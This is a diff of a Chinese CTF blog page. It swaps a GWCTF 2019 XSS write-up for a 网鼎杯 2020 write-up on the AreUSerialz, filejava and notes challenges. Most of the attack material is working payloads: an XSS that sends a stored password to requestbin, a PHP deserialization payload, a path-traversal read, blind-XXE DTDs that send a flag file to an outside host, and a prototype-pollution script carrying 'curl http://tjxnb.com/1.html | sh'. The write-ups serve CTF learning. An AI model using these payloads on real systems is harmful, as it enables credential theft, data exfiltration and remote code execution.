@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>[GWCTF 2019]mypassword(xss) | 过客</title>
+  <title>[网鼎杯 2020 青龙组]web | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="[GWCTF 2019]mypassword(xss) | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[网鼎杯 2020 青龙组]web | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,8 +25,8 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
-    <meta property="og:description" content="[GWCTF 2019]mypassword(xss)"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/NN6i2N3G-/"/>
+    <meta property="og:description" content="[网鼎杯 2020 青龙组]web"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/nmxAW2K-f/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content="过客"/>
@@ -80,13 +80,11 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
-            
         </span>
-            <h1>[GWCTF 2019]mypassword(xss)</h1>
+            <h1>[网鼎杯 2020 青龙组]web</h1>
             <span class="meta">
             	Posted on
-              2020-04-26，2 min read
+              2020-05-10，6 min read
             </span>
           </div>
         </div>
@@ -99,44 +97,148 @@
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
-          <p>看着WP复现的。。<br>
-前端的东西。还是不太懂</p>
-<p>首先就登陆注册。随便注册个账户登上去。提示密码在源码中。<br>
-有个留言板。F12有过滤规则。还有个查看。估计是XSS这类的<br>
-在登陆处。有个login.js</p>
-<pre><code>if (document.cookie &amp;&amp; document.cookie != '') {
-	var cookies = document.cookie.split('; ');
-	var cookie = {};
-	for (var i = 0; i &lt; cookies.length; i++) {
-		var arr = cookies[i].split('=');
-		var key = arr[0];
-		cookie[key] = arr[1];
-	}
-	if(typeof(cookie['user']) != &quot;undefined&quot; &amp;&amp; typeof(cookie['psw']) != &quot;undefined&quot;){
-		document.getElementsByName(&quot;username&quot;)[0].value = cookie['user'];
-		document.getElementsByName(&quot;password&quot;)[0].value = cookie['psw'];
-	}
+          <h1 id="areuserialz">AreUSerialz</h1>
+<p>题目给出了源码。是个反序列化。<br>
+大致就是op决定执行函数。filename是文件名。contents是文件内容。<br>
+有个文件读取。直接op=2。filename=flag.php就行了<br>
+由于PHP版本是7。而php7对于类的属性。并不敏感。题目中的protected属性。由于需要%00。所以不能直接用。可以改为public属性带入。</p>
+<pre><code>class FileHandler {
+    public  $op=2;
+    public  $filename='flag.php';
+}
+$a=new FileHandler();
+echo urlencode(serialize($a));
+</code></pre>
+<p>这里如果带上了contents属性。就不能读取。不知道为啥。<br>
+或者就是带上属性。然后修改类的属性数量。3改为2。表示这个类只有两个属性<br>
+还能通过/proc/self/cmdline获得apache的配置文件路径<br>
+然后用绝对路径去读取<br>
+还有一种解法是。利用S代替s &quot;\00*\00xxx&quot;这样。</p>
+<pre><code>&lt;?php
+class test {
+        public function scan(){
+                var_dump(getcwd());
+        }
+        public function __destruct(){
+                $this-&gt;scan();
+        }
+}
+$a=new test();
+#触发destruct调用的scan函数。当前目录会在根目录/
+$a-&gt;scan();
+#直接调用的scan函数。目录会在当前目录/var/www/html
+</code></pre>
+<h1 id="filejava">filejava</h1>
+<p>首先就是个文件上传。然后下载处存在任意文件下载。<br>
+读取web.xml</p>
+<pre><code>../../../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/web.xml
+</code></pre>
+<p>webapps是tomcat的所有项目的根目录。然后file_in_java是这个项目的根目录。相当于/var/www/html中的html</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;2.5&quot;&gt;
+  &lt;display-name&gt;file_in_java&lt;/display-name&gt;
+  &lt;welcome-file-list&gt;
+    &lt;welcome-file&gt;upload.jsp&lt;/welcome-file&gt;
+  &lt;/welcome-file-list&gt;
+  &lt;servlet&gt;
+    &lt;description&gt;&lt;/description&gt;
+    &lt;display-name&gt;UploadServlet&lt;/display-name&gt;
+    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;servlet&gt;
+    &lt;description&gt;&lt;/description&gt;
+    &lt;display-name&gt;ListFileServlet&lt;/display-name&gt;
+    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/ListFileServlet&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+  &lt;servlet&gt;
+    &lt;description&gt;&lt;/description&gt;
+    &lt;display-name&gt;DownloadServlet&lt;/display-name&gt;
+    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;/servlet-class&gt;
+  &lt;/servlet&gt;
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;
+&lt;/web-app&gt;
+</code></pre>
+<p>根据web.xml<br>
+我们得到当前项目下有ListFileServlet和DownloadServlet<br>
+class文件在WEB-INF/classes下<br>
+所以我们去读取../../../../../../../../../../../usr/local/tomcat/webapps/file_in_java/WEB-INF/classes/cn/abc/servlet/UploadServlet.class<br>
+反编译后得到java代码</p>
+<pre><code>        
+        if (filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName)) {
+          
+          try {
+
+            
+            Workbook wb1 = WorkbookFactory.create(in);
+            Sheet sheet = wb1.getSheetAt(0);
+            System.out.println(sheet.getFirstRowNum());
+          } catch (InvalidFormatException e) {
+            System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;);
+            e.printStackTrace();
+          } 
+        }
+</code></pre>
+<p>如果是以excel-开头。然后是xlsx结尾的文件。就会调用WorkbookFactory.create去处理xlsx文件<br>
+这会触发xxe</p>
+<pre><code>https://www.cnblogs.com/thespace/p/12400719.html
+</code></pre>
+<p>由于代码中。解析excel后没有输出点。。所以是bind xxe</p>
+<pre><code>https://xz.aliyun.com/t/3357#toc-8
+</code></pre>
+<p>远程</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'http://xxxxxxx:6666?p=%file;'&gt;&quot;&gt;
+</code></pre>
+<p>将excel解压后。修改Content-type.xml。在第二行加入如下代码</p>
+<pre><code>&lt;!DOCTYPE convert [ 
+&lt;!ENTITY % remote SYSTEM &quot;http://tjxnb.com/file.dtd&quot;&gt;
+%remote;%int;%send;
+]&gt;
+</code></pre>
+<p>监听端口。文件上传。得到Flag、</p>
+<h1 id="notes">notes</h1>
+<p>源码审计。<br>
+undefsafe库存在原型参数链污染。</p>
+<pre><code>let id = req.body.id;
+let author = req.body.author;
+let enote = req.body.raw;
+if (id &amp;&amp; author &amp;&amp; enote) {
+    notes.edit_note(id, author, enote);
+edit_note(id, author, raw) {
+    undefsafe(this.note_list, id + '.author', author);
+    undefsafe(this.note_list, id + '.raw_note', raw);
 }
 </code></pre>
-<p>大概是从cookie中取出值。然后放入cookie数组<br>
-最后将这个数组填入username。password框。<br>
-实现记住密码的功能。<br>
-我们可以调用这个js。然后自定义两个框。管理员访问的时候。就会将user。psw写入框中。然后通过http发送。</p>
-<pre><code>&lt;incookieput type=&quot;text&quot; name=&quot;username&quot;&gt;
-&lt;incookieput type=&quot;password&quot; name=&quot;password&quot;&gt;
-&lt;scrcookieipt scookierc=&quot;./js/login.js&quot;&gt;&lt;/scrcookieipt&gt;
-&lt;scrcookieipt&gt;
-    var psw = docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;
-    docucookiement.locacookietion=&quot;http://http.requestbin.buuoj.cn/1e8jfct1/?a=&quot;+psw;
-&lt;/scrcookieipt&gt;
+<p>这里先接受了post的一个author和raw和id<br>
+然后传入Edit_note函数。这里使用了undefsafe函数。<br>
+如果id传为为<code>__proto__</code>就存在参数链污染<br>
+<code>this.note_list.__proto__.author=author</code></p>
+<pre><code>a = {'raw': 'curl http://tjxnb.com/1.html | sh', 'id': '__proto__', 'author': 'test'}
+import requests
+url = &quot;http://f13d06664e32474aad611a68000b395fba21a904678b4e4a.cloudgame2.ichunqiu.com:8080/&quot;
+print(requests.post(url+&quot;edit_note&quot;,json=a).text);
+print(requests.get(url+&quot;status&quot;).text);
 </code></pre>
-<p>不知道为啥。我用xss平台去打。。没反应。控制台也没任何csp的警告。</p>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/d_d-c9pyD/">
+            <a href="https://guokeya.github.io/post/QWCfu8amD/">
               <span class="post-title">
-                安恒四月月赛 WP&rarr;
+                Websec 刷题&rarr;
               </span>
             </a>
           </p>
